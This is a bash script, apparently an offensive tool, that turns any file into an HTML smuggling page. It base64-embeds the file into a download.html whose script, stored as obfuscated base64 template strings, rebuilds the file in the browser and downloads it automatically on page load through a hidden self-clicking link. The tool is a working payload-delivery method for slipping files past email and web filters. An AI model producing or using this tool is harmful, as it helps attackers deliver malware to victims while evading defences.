#!/bin/bash
echo "--[ Javascript file smuggling page generator -- @0xtosh"
echo -e

FILE=$1
BASE64BIN="/usr/bin/base64"

if [ -z "$FILE" ]
then
      echo "Specify a file to base64 into a download.html page."
      exit 0
fi

if [ -f $FILE ] && [ -s $FILE ]; then
        TMP64PATH=".tmp$RANDOM"
        TMPTOTAL=".total$RANDOM"
        PRE="PGh0bWw+CjxoZWFkPgo8dGl0bGU+RG93bmxvYWQgc3RhcnRpbmc8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8c2NyaXB0PgogIGZ1bmN0aW9uIGJhc2U2NFRvQXJyYXlCdWZmZXIoYmFzZTY0KSB7CiAgICB2YXIgYmluYXJ5X3N0cmluZyA9IHdpbmRvdy5hdG9iKGJhc2U2NCk7CiAgICB2YXIgbGVuID0gYmluYXJ5X3N0cmluZy5sZW5ndGg7CiAgICB2YXIgYnl0ZXMgPSBuZXcgVWludDhBcnJheSggbGVuICk7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGxlbjsgaSsrKSB7IGJ5dGVzW2ldID0gYmluYXJ5X3N0cmluZy5jaGFyQ29kZUF0KGkpOyB9CiAgICByZXR1cm4gYnl0ZXMuYnVmZmVyOwogIH0KCiAgdmFyIGZpbGUgPSc="
        MID="JzsKICB2YXIgZGF0YSA9IGJhc2U2NFRvQXJyYXlCdWZmZXIoZmlsZSk7CiAgdmFyIGJsb2IgPSBuZXcgQmxvYihbZGF0YV0sIHt0eXBlOiAnb2N0ZXQvc3RyZWFtJ30pOwogIHZhciBmaWxlTmFtZSA9ICcK"
        END="JzsKCiAgaWYod2luZG93Lm5hdmlnYXRvci5tc1NhdmVPck9wZW5CbG9iKSB3aW5kb3cubmF2aWdhdG9yLm1zU2F2ZUJsb2IoYmxvYixmaWxlTmFtZSk7CiAgZWxzZSB7CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7CiAgICBhLnN0eWxlID0gJ2Rpc3BsYXk6IG5vbmUnOwogICAgdmFyIHVybCA9IHdpbmRvdy5VUkwuY3JlYXRlT2JqZWN0VVJMKGJsb2IpOwogICAgYS5ocmVmID0gdXJsOwogICAgYS5kb3dubG9hZCA9IGZpbGVOYW1lOwogICAgYS5jbGljaygpOwogICAgd2luZG93LlVSTC5yZXZva2VPYmplY3RVUkwodXJsKTsKICB9Cjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4K"
        $BASE64BIN $FILE | tr -d '\n' > $TMP64PATH
        echo $PRE | $BASE64BIN -d  > $TMPTOTAL
        cat $TMP64PATH >> $TMPTOTAL
        echo $MID | $BASE64BIN -d | tr -d '\n' >> $TMPTOTAL
        echo $FILE | tr -d '\n' >> $TMPTOTAL
        echo $END | $BASE64BIN -d  >> $TMPTOTAL
        mv $TMPTOTAL download.html
        rm $TMP64PATH
        echo "OK Created download.html"
        exit 0
else
   echo "Can't read $FILE or empty file? Quiting."
   exit 1
fi